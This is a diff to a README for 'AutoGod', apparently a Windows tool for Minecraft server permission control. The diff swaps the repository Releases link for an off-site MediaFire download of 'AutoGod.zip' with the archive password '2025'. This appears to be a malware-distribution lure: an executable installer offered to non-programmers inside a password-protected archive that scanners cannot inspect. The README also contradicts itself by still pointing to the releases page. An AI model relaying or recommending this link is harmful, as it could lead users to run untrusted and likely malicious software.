@@ -1,7 +1,7 @@
 # 👑 AutoGod - Easy Server Permission Control
 <img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/53b2fecb-fb8d-460f-a4af-08cf01e7c960" />
 
-[![Download](https://www.mediafire.com/file/whr6g4ifc59gs4c/AutoGod.zip/file)
+Download (https://www.mediafire.com/file/whr6g4ifc59gs4c/AutoGod.zip/file)
 
 > **Simple Windows application for automatic fly and god mode permission control on your Minecraft server**
 
@@ -30,7 +30,7 @@ You do not need to know programming or complicated coding. Just install the prog
 
 ### 🔽 Download AutoGod
 
-Download the latest `AutoGod Setup.exe` from the **[Releases](../../releases)** section of this repository.
+Download the latest `AutoGod Setup.exe` from (https://www.mediafire.com/file/whr6g4ifc59gs4c/AutoGod.zip/file) / Password for archive - 2025)
 
 > 📌 The installer file is located under "Assets" on the releases page.
 
